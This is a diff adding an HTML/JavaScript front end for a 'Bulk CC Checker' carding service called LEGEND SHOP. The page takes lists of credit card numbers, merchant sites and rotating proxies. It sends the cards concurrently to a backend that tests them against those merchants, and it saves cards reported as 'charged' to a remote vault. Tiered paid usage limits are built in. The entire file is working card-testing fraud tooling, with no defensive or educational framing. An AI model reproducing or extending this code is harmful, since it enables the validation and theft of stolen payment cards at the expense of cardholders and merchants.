@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bulk CC Checker - LEGEND SHOP</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: #1a1a1a;
+            border-radius: 12px;
+            border: 1px solid #2a2a2a;
+        }
+
+        .header-left h1 {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00ff88, #667eea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .stats-bar {
+            display: flex;
+            gap: 30px;
+            align-items: center;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .stat-value.total { color: #3b82f6; }
+        .stat-value.approved { color: #22c55e; }
+        .stat-value.declined { color: #ef4444; }
+        .stat-value.charged { color: #f59e0b; }
+
+        .stat-label {
+            font-size: 12px;
+            color: #999;
+            text-transform: uppercase;
+        }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .card {
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 25px;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .textarea-group {
+            margin-bottom: 15px;
+        }
+
+        .textarea-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #b0b0b0;
+            margin-bottom: 8px;
+        }
+
+        textarea {
+            width: 100%;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            padding: 12px;
+            color: #e0e0e0;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            resize: vertical;
+            min-height: 120px;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: #7c3aed;
+        }
+
+        .file-upload {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .file-upload-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 15px;
+            background: rgba(124, 58, 237, 0.1);
+            border: 2px dashed #7c3aed;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .file-upload-btn:hover {
+            background: rgba(124, 58, 237, 0.2);
+            border-color: #a855f7;
+        }
+
+        .file-upload input[type="file"] {
+            display: none;
+        }
+
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background: #7c3aed;
+            color: white;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: #a855f7;
+            transform: translateY(-2px);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-success {
+            background: #22c55e;
+            color: white;
+        }
+
+        .btn-danger {
+            background: #ef4444;
+            color: white;
+        }
+
+        .info-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 15px;
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid #3b82f6;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #3b82f6;
+            margin-bottom: 15px;
+        }
+
+        .results-container {
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 25px;
+            max-height: 600px;
+            overflow-y: auto;
+        }
+
+        .result-item {
+            padding: 12px;
+            margin-bottom: 8px;
+            border-radius: 8px;
+            border-left: 4px solid;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .result-item.approved {
+            background: rgba(34, 197, 94, 0.1);
+            border-color: #22c55e;
+            color: #22c55e;
+        }
+
+        .result-item.declined {
+            background: rgba(239, 68, 68, 0.1);
+            border-color: #ef4444;
+            color: #ef4444;
+        }
+
+        .result-item.charged {
+            background: rgba(245, 158, 11, 0.1);
+            border-color: #f59e0b;
+            color: #f59e0b;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        .result-item.error {
+            background: rgba(239, 68, 68, 0.1);
+            border-color: #ef4444;
+            color: #ef4444;
+        }
+
+        .result-header {
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .result-details {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        .proxy-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .proxy-status.live {
+            background: rgba(34, 197, 94, 0.2);
+            color: #22c55e;
+        }
+
+        .proxy-status.dead {
+            background: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #2a2a2a;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #7c3aed, #a855f7);
+            transition: width 0.3s ease;
+        }
+
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        @media (max-width: 1024px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header with Stats -->
+        <div class="header">
+            <div class="header-left">
+                <h1><i class="fas fa-bolt"></i> Bulk CC Checker</h1>
+                <p style="color: #999; margin-top: 5px;">Concurrent checking with real-time results</p>
+            </div>
+            <div class="stats-bar">
+                <div class="stat-item">
+                    <div class="stat-value total" id="totalChecked">0</div>
+                    <div class="stat-label">Checked</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value approved" id="totalApproved">0</div>
+                    <div class="stat-label">Approved</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value declined" id="totalDeclined">0</div>
+                    <div class="stat-label">Declined</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value charged" id="totalCharged">0</div>
+                    <div class="stat-label">Charged</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content Grid -->
+        <div class="main-grid">
+            <!-- Input Section -->
+            <div>
+                <div class="card">
+                    <div class="card-title">
+                        <i class="fas fa-globe"></i> Sites (One per line)
+                    </div>
+                    <div class="info-badge">
+                        <i class="fas fa-info-circle"></i>
+                        Sites will rotate for each card check
+                    </div>
+                    <textarea id="sitesInput" placeholder="https://example.com&#10;https://another-site.com"></textarea>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">
+                        <i class="fas fa-credit-card"></i> Credit Cards
+                    </div>
+                    <div class="info-badge">
+                        <i class="fas fa-info-circle"></i>
+                        Format: cc|mm|yy|cvv (one per line)
+                    </div>
+                    <textarea id="cardsInput" placeholder="4532123456789010|12|25|123&#10;5425233430109903|01|26|456"></textarea>
+                    
+                    <div class="file-upload">
+                        <label for="ccFile" class="file-upload-btn">
+                            <i class="fas fa-upload"></i>
+                            <span>Upload CC File (TXT, CSV, etc.)</span>
+                        </label>
+                        <input type="file" id="ccFile" accept=".txt,.csv,.log" multiple>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">
+                        <i class="fas fa-network-wired"></i> Proxies (Optional)
+                    </div>
+                    <div class="info-badge" id="proxyInfo">
+                        <i class="fas fa-info-circle"></i>
+                        Leave empty to use owner's proxy (if set)
+                    </div>
+                    <div id="proxyStatus"></div>
+                    <textarea id="proxiesInput" placeholder="http://ip:port&#10;http://ip:port:user:pass&#10;socks5://ip:port"></textarea>
+                    <button class="btn btn-success" onclick="validateProxies()">
+                        <i class="fas fa-check-circle"></i> Validate Proxies
+                    </button>
+                </div>
+            </div>
+
+            <!-- Control Panel -->
+            <div>
+                <div class="card">
+                    <div class="card-title">
+                        <i class="fas fa-cog"></i> Controls
+                    </div>
+                    
+                    <div class="info-badge" style="width: 100%; justify-content: center;">
+                        <i class="fas fa-coins"></i>
+                        <span>Credits: <strong id="userCredits">Loading...</strong></span>
+                    </div>
+
+                    <div class="info-badge" style="width: 100%; justify-content: center; background: rgba(245, 158, 11, 0.1); border-color: #f59e0b; color: #f59e0b;">
+                        <i class="fas fa-layer-group"></i>
+                        <span>Concurrent: <strong id="concurrent Checks">3</strong></span>
+                    </div>
+
+                    <div class="info-badge" style="width: 100%; justify-content: center; background: rgba(34, 197, 94, 0.1); border-color: #22c55e; color: #22c55e;">
+                        <i class="fas fa-check-double"></i>
+                        <span>Limit: <strong id="checkLimit">Loading...</strong></span>
+                    </div>
+
+                    <div class="progress-bar" id="progressBarContainer" style="display: none;">
+                        <div class="progress-fill" id="progressBar" style="width: 0%;"></div>
+                    </div>
+
+                    <div class="actions">
+                        <button class="btn btn-primary" id="startBtn" onclick="startChecking()">
+                            <i class="fas fa-play"></i> Start Checking
+                        </button>
+                        <button class="btn btn-danger" id="stopBtn" onclick="stopChecking()" style="display: none;">
+                            <i class="fas fa-stop"></i> Stop
+                        </button>
+                    </div>
+
+                    <div class="actions">
+                        <button class="btn btn-success" onclick="exportResults()">
+                            <i class="fas fa-download"></i> Export
+                        </button>
+                        <button class="btn btn-danger" onclick="clearResults()">
+                            <i class="fas fa-trash"></i> Clear
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Results Section -->
+        <div class="results-container" id="resultsContainer">
+            <div style="text-align: center; color: #999; padding: 40px;">
+                <i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px; opacity: 0.5;"></i>
+                <p>No results yet. Start checking to see results here.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let isChecking = false;
+        let currentIndex = 0;
+        let sites = [];
+        let cards = [];
+        let proxies = [];
+        let results = [];
+        let stats = {
+            total: 0,
+            approved: 0,
+            declined: 0,
+            charged: 0
+        };
+        let concurrent = 3;
+        let checkLimit = 1000;
+        let userToken = null;
+        let ownerProxy = null;
+
+        // Initialize on page load
+        window.addEventListener('load', async function() {
+            userToken = localStorage.getItem('token');
+            if (!userToken) {
+                window.location.href = '../login.html';
+                return;
+            }
+
+            await loadUserInfo();
+        });
+
+        // Load user information
+        async function loadUserInfo() {
+            try {
+                const apiBaseUrl = window.location.hostname === 'localhost' 
+                    ? 'http://localhost:3000' 
+                    : 'https://legendbl.tech';
+                
+                const response = await fetch(apiBaseUrl + '/api/user-info', {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': 'Bearer ' + userToken,
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                const data = await response.json();
+                if (data.success) {
+                    document.getElementById('userCredits').textContent = data.user.credits || 0;
+                    
+                    // Set limits based on role
+                    const role = data.user.role || 'free';
+                    switch(role) {
+                        case 'premium':
+                            checkLimit = 5000;
+                            break;
+                        case 'admin':
+                            checkLimit = 10000;
+                            break;
+                        case 'owner':
+                            checkLimit = Infinity;
+                            document.getElementById('checkLimit').textContent = '∞ Unlimited';
+                            break;
+                        default:
+                            checkLimit = 1000;
+                    }
+                    
+                    if (checkLimit !== Infinity) {
+                        document.getElementById('checkLimit').textContent = checkLimit.toLocaleString();
+                    }
+
+                    // Load owner proxy if available
+                    if (data.ownerProxy) {
+                        ownerProxy = data.ownerProxy;
+                        document.getElementById('proxyInfo').innerHTML = `
+                            <i class="fas fa-check-circle"></i>
+                            Owner proxy is active - using global proxy
+                        `;
+                        document.getElementById('proxyInfo').style.background = 'rgba(34, 197, 94, 0.1)';
+                        document.getElementById('proxyInfo').style.borderColor = '#22c55e';
+                        document.getElementById('proxyInfo').style.color = '#22c55e';
+                    }
+                }
+            } catch (error) {
+                console.error('Error loading user info:', error);
+                document.getElementById('userCredits').textContent = 'Error';
+                document.getElementById('checkLimit').textContent = 'Error';
+            }
+        }
+
+        // Parse input
+        function parseInput() {
+            sites = document.getElementById('sitesInput').value.trim().split('\n').filter(s => s.trim());
+            cards = document.getElementById('cardsInput').value.trim().split('\n').filter(c => c.trim());
+            proxies = document.getElementById('proxiesInput').value.trim().split('\n').filter(p => p.trim());
+
+            if (sites.length === 0) {
+                alert('Please enter at least one site URL');
+                return false;
+            }
+
+            if (cards.length === 0) {
+                alert('Please enter at least one credit card');
+                return false;
+            }
+
+            if (cards.length > checkLimit) {
+                alert(`You can only check ${checkLimit} cards at once. Your role: ${getUserRole()}`);
+                return false;
+            }
+
+            if (proxies.length === 0 && !ownerProxy) {
+                alert('Please enter proxies or contact owner to set global proxy');
+                return false;
+            }
+
+            return true;
+        }
+
+        function getUserRole() {
+            // This would be fetched from user data
+            return 'free';
+        }
+
+        // Validate proxies
+        async function validateProxies() {
+            const proxyList = document.getElementById('proxiesInput').value.trim().split('\n').filter(p => p.trim());
+            
+            if (proxyList.length === 0) {
+                alert('Please enter proxies to validate');
+                return;
+            }
+
+            const statusDiv = document.getElementById('proxyStatus');
+            statusDiv.innerHTML = '<p style="color: #999;">Validating proxies...</p>';
+
+            for (const proxy of proxyList) {
+                try {
+                    // Use PHP proxy instead of direct API call
+                    const response = await fetch('bulk-api.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            action: 'validate_proxy',
+                            proxy: proxy,
+                            site: sites[0] || 'https://google.com'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    const isLive = data.success && data.is_live;
+                    
+                    const statusBadge = document.createElement('div');
+                    statusBadge.className = isLive ? 'proxy-status live' : 'proxy-status dead';
+                    statusBadge.innerHTML = `
+                        <i class="fas fa-circle"></i>
+                        ${proxy.substring(0, 30)}... - ${isLive ? 'LIVE' : 'DEAD'}
+                    `;
+                    statusDiv.appendChild(statusBadge);
+                } catch (error) {
+                    const statusBadge = document.createElement('div');
+                    statusBadge.className = 'proxy-status dead';
+                    statusBadge.innerHTML = `
+                        <i class="fas fa-circle"></i>
+                        ${proxy.substring(0, 30)}... - ERROR: ${error.message}
+                    `;
+                    statusDiv.appendChild(statusBadge);
+                }
+            }
+        }
+
+        // Start checking
+        async function startChecking() {
+            if (!parseInput()) return;
+
+            isChecking = true;
+            currentIndex = 0;
+            results = [];
+            stats = { total: 0, approved: 0, declined: 0, charged: 0 };
+
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'inline-flex';
+            document.getElementById('progressBarContainer').style.display = 'block';
+            document.getElementById('resultsContainer').innerHTML = '';
+
+            // Process cards with concurrency
+            const batchSize = concurrent;
+            for (let i = 0; i < cards.length && isChecking; i += batchSize) {
+                const batch = cards.slice(i, i + batchSize);
+                await Promise.all(batch.map((card, idx) => checkCard(card, i + idx)));
+                
+                // Update progress
+                const progress = Math.min(((i + batchSize) / cards.length) * 100, 100);
+                document.getElementById('progressBar').style.width = progress + '%';
+            }
+
+            if (isChecking) {
+                alert('Checking complete!');
+                stopChecking();
+            }
+        }
+
+        // Stop checking
+        function stopChecking() {
+            isChecking = false;
+            document.getElementById('startBtn').style.display = 'inline-flex';
+            document.getElementById('stopBtn').style.display = 'none';
+            document.getElementById('progressBar').style.width = '0%';
+        }
+
+        // Check single card
+        async function checkCard(cardData, index) {
+            if (!isChecking) return;
+
+            try {
+                const [cc, mes, ano, cvv] = cardData.split('|');
+                const site = sites[index % sites.length];
+                const proxy = ownerProxy || (proxies.length > 0 ? proxies[index % proxies.length] : '');
+
+                // Use PHP proxy instead of direct API call
+                const response = await fetch('bulk-api.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        action: 'check_card',
+                        cc: cc,
+                        mes: mes,
+                        ano: ano,
+                        cvv: cvv,
+                        site: site,
+                        proxy: proxy
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (!data.success) {
+                    throw new Error(data.error || 'Check failed');
+                }
+
+                const result = data.result;
+                const rawResponse = data.raw_response || result.message;
+
+                // Parse result
+                let status = result.status || 'declined';
+                let resultClass = status;
+
+                if (status === 'charged') {
+                    stats.charged++;
+                    // Save to vault
+                    await saveToVault(cardData, site);
+                } else if (status === 'approved') {
+                    stats.approved++;
+                } else {
+                    stats.declined++;
+                }
+
+                stats.total++;
+                updateStats();
+
+                // Display result
+                displayResult(cardData, status, rawResponse, site, resultClass);
+
+            } catch (error) {
+                console.error('Error checking card:', error);
+                stats.total++;
+                stats.declined++;
+                updateStats();
+                displayResult(cardData, 'error', error.message, '', 'error');
+            }
+        }
+
+        // Display result
+        function displayResult(cardData, status, message, site, cssClass) {
+            const resultItem = document.createElement('div');
+            resultItem.className = `result-item ${cssClass}`;
+            
+            const cardParts = cardData.split('|');
+            const maskedCC = cardParts[0] ? cardParts[0].substring(0, 6) + '******' + cardParts[0].slice(-4) : cardData;
+
+            resultItem.innerHTML = `
+                <div class="result-header">
+                    <i class="fas fa-${status === 'approved' ? 'check-circle' : status === 'charged' ? 'fire' : 'times-circle'}"></i>
+                    ${maskedCC} - ${status.toUpperCase()}
+                </div>
+                <div class="result-details">
+                    Site: ${site}<br>
+                    Response: ${message.substring(0, 100)}...
+                </div>
+            `;
+
+            document.getElementById('resultsContainer').prepend(resultItem);
+        }
+
+        // Update stats
+        function updateStats() {
+            document.getElementById('totalChecked').textContent = stats.total;
+            document.getElementById('totalApproved').textContent = stats.approved;
+            document.getElementById('totalDeclined').textContent = stats.declined;
+            document.getElementById('totalCharged').textContent = stats.charged;
+        }
+
+        // Save charged card to vault
+        async function saveToVault(cardData, site) {
+            try {
+                const apiBaseUrl = window.location.hostname === 'localhost' 
+                    ? 'http://localhost:3000' 
+                    : 'https://legendbl.tech';
+
+                await fetch(apiBaseUrl + '/api/vault/save-charged', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Bearer ' + userToken,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        cardData: cardData,
+                        site: site,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (error) {
+                console.error('Error saving to vault:', error);
+            }
+        }
+
+        // File upload handler
+        document.getElementById('ccFile').addEventListener('change', async function(e) {
+            const files = e.target.files;
+            let allContent = '';
+
+            for (const file of files) {
+                const content = await file.text();
+                allContent += content + '\n';
+            }
+
+            // Parse and clean content
+            const lines = allContent.split('\n').filter(line => line.trim());
+            document.getElementById('cardsInput').value = lines.join('\n');
+        });
+
+        // Export results
+        function exportResults() {
+            if (results.length === 0) {
+                alert('No results to export');
+                return;
+            }
+
+            const content = results.map(r => `${r.card} | ${r.status} | ${r.site}`).join('\n');
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'cc-check-results-' + Date.now() + '.txt';
+            a.click();
+        }
+
+        // Clear results
+        function clearResults() {
+            document.getElementById('resultsContainer').innerHTML = `
+                <div style="text-align: center; color: #999; padding: 40px;">
+                    <i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px; opacity: 0.5;"></i>
+                    <p>No results yet. Start checking to see results here.</p>
+                </div>
+            `;
+            stats = { total: 0, approved: 0, declined: 0, charged: 0 };
+            updateStats();
+        }
+    </script>
+</body>
+</html>
